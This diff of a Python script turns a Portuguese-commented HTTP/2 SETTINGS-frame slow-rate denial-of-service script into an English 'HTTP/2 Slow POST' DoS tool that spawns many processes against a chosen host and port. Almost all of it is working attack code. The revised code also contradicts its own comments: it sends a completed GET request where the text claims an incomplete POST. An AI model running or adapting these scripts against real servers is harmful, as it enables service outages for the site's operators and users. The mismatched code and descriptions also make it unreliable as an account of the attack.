@@ -1,17 +1,19 @@
 #!/usr/bin/python3
 """
-HTTP/2 Slow Rate SETTINGS Frame Attack Script
-Este script inicia múltiplos processos para realizar um ataque de Negação de Serviço (DoS) enviando frames SETTINGS 
-incompletos e sem reconhecimento, causando uso de recursos no servidor que aguarda o reconhecimento.
+HTTP/2 Slow POST Attack Script
+This script initiates multiple processes to perform a Slow POST Denial of Service (DoS) attack over an HTTP/2 connection.
+It sends an incomplete HTTP/2 POST request with large content-length but never completes the data transfer,
+causing the server to hold resources waiting for the request to finish.
 
-Uso:
-    python slowrateDoSattackSETTINGS.py --target <hostname> --port <port> --process <number_of_processes> --delay <delay_time>
+Usage:
+    python slowrateDoSattackcompletePOSTheader.py --target <hostname> --port <port> --path <path> --process <number_of_processes> --delay <delay_time>
 
-Argumentos:
-    -t, --target   : Hostname ou endereço IP alvo (obrigatório)
-    -p, --port     : Porta do alvo (padrão: 443)
-    -P, --process  : Número de processos de ataque a serem iniciados (padrão: 1)
-    -d, --delay    : Intervalo entre o início de cada processo em segundos (padrão: 0.1)
+Arguments:
+    -t, --target   : Target hostname or IP address (required)
+    -p, --port     : Target port (default: 443)
+    --path         : Target path (default: "/")
+    -P, --process  : Number of attack processes to spawn (default: 1)
+    -d, --delay    : Delay between starting each process in seconds (default: 0.1)
 """
 
 import socket
@@ -24,91 +26,94 @@ from multiprocessing import Process
 
 def establish_tls_connection(host, port):
     """
-    Estabelece uma conexão SSL/TLS com o servidor alvo.
-    Esta conexão suporta o protocolo HTTP/2.
+    Establishes an SSL/TLS connection to the target server.
+    This connection supports HTTP/2 protocol.
     """
     try:
         context = ssl.create_default_context()
-        context.set_alpn_protocols(['h2'])  # Especifica HTTP/2 como o protocolo desejado
+        context.set_alpn_protocols(['h2'])  # Specify HTTP/2 as the desired protocol
         sock = socket.create_connection((host, port))
         tls_sock = context.wrap_socket(sock, server_hostname=host)
         return tls_sock
     except Exception as e:
-        print(f"Erro ao estabelecer conexão TLS: {e}")
+        print(f"Error establishing TLS connection: {e}")
         exit(1)
 
-def send_slow_settings(tls_sock, target):
+def send_slow_setting_frame(tls_sock, target, path):
     """
-    Envia repetidamente frames SETTINGS para o servidor, sem confirmar o reconhecimento.
+    Sends an incomplete HTTP/2 POST request to the target server, manipulating flags to keep the connection open.
     """
     try:
-        # Inicializa a conexão HTTP/2
+        # Initialize the HTTP/2 connection
         conn = h2.connection.H2Connection()
         conn.initiate_connection()
         tls_sock.sendall(conn.data_to_send())
 
-        # Envio inicial do frame SETTINGS do cliente
-        conn.update_settings({})  # SETTINGS sem configurações
-        tls_sock.sendall(conn.data_to_send())
+        # Prepare the POST headers
+        headers = [
+            (':method', 'GET'),
+            (':authority', target),
+            (':scheme', 'https'),
+            (':path', path)
+        ]
+
+        # Send HEADERS frame with END_HEADERS set and END_STREAM unset
+        stream_id = conn.get_next_available_stream_id()
         
-        print(f"Frame SETTINGS inicial enviado. Servidor aguardando reconhecimento...")
+        conn.send_headers(stream_id, headers, end_stream=True)
+        tls_sock.sendall(conn.data_to_send())
 
-        # Loop para enviar SETTINGS repetidamente sem reconhecer o frame SETTINGS do servidor
+        print(f"Complete headers sent.")
+
+        # Loop to keep the connection open without sending data (simulating a Slow POST)
         while True:
-            # Recebe dados do servidor
-            data = tls_sock.recv(65535)
-            if data:
-                events = conn.receive_data(data)
-                for event in events:
-                    # Recebe o frame SETTINGS do servidor e ignora o reconhecimento
-                    if isinstance(event, h2.events.SettingsAcknowledged):
-                        print(f"Servidor enviou frame SETTINGS. Ignorando reconhecimento...")
-
-            # Envia outro frame SETTINGS do cliente para manter a conexão ativa
-            conn.update_settings({})
+            # Send data in a low, steady rate to avoid triggering server's defenses
+            time.sleep(5)
+            
             tls_sock.sendall(conn.data_to_send())
-            time.sleep(1)  # Intervalo para manter a conexão lenta
 
     except Exception as e:
-        print(f"Erro durante o ataque: {e}")
+        print(f"Error during the attack: {e}")
     finally:
+        conn.close_connection()
+        tls_sock.sendall(conn.data_to_send())
         tls_sock.close()
 
 def main():
     """
-    Função principal para executar o ataque de Slow Rate SETTINGS.
+    Main function to perform the HTTP/2 Slow POST attack. It establishes a connection and sends incomplete POST requests.
     """
-    # Estabelece a conexão segura TLS
+    # Establish a secure TLS connection
     tls_sock = establish_tls_connection(args.target, args.port)
     
-    # Envia o ataque de slow settings
-    send_slow_settings(tls_sock, args.target)
+    # Send the slow POST request
+    send_slow_setting_frame(tls_sock, args.target, args.path)
 
 if __name__ == "__main__":
-    # Análise dos argumentos de linha de comando
-    parser = argparse.ArgumentParser(description="Realiza um ataque de Slow Rate usando frames SETTINGS no HTTP/2.")
-    parser.add_argument('-t', '--target', type=str, required=True, help="Hostname ou endereço IP alvo.")
-    parser.add_argument('-p', '--port', type=int, default=443, help="Porta do alvo (padrão: 443).")
-    parser.add_argument('-P', '--process', type=int, default=1, help="Número de processos a serem iniciados (padrão: 1).")
-    parser.add_argument('-d', '--delay', type=float, default=0.1, help="Intervalo entre processos em segundos (padrão: 0.1).")
+    # Argument parsing for command-line options
+    parser = argparse.ArgumentParser(description="Perform a Slow POST attack over HTTP/2.")
+    parser.add_argument('-t', '--target', type=str, required=True, help="Target hostname or IP address.")
+    parser.add_argument('-p', '--port', type=int, default=443, help="Target port (default: 443).")
+    parser.add_argument('--path', type=str, default="/", help="Target path (default: '/').")
+    parser.add_argument('-P', '--process', type=int, default=1, help="Number of processes to spawn (default: 1).")
+    parser.add_argument('-d', '--delay', type=float, default=0.1, help="Delay between spawning processes in seconds (default: 0.1).")
 
     args = parser.parse_args()
 
-    # Lista para manter os objetos de processos
+    # List to hold process objects
     process_list = []
 
-    # Inicia o número especificado de processos
+    # Spawn the specified number of processes
     for i in range(args.process):
-        # Cria um novo processo para a função principal de ataque
+        # Create a new process targeting the main attack function
         process = Process(target=main, daemon=True)
         process_list.append(process)
         process.start()
 
-        # Intervalo entre processos para controlar a carga no servidor
+        # Delay between starting each process to control the load on the server
         time.sleep(args.delay)
 
-    # Aguarda a conclusão dos processos
+    # Join the processes to wait for their completion
     for process in process_list:
         if process.is_alive():
             process.join()
-
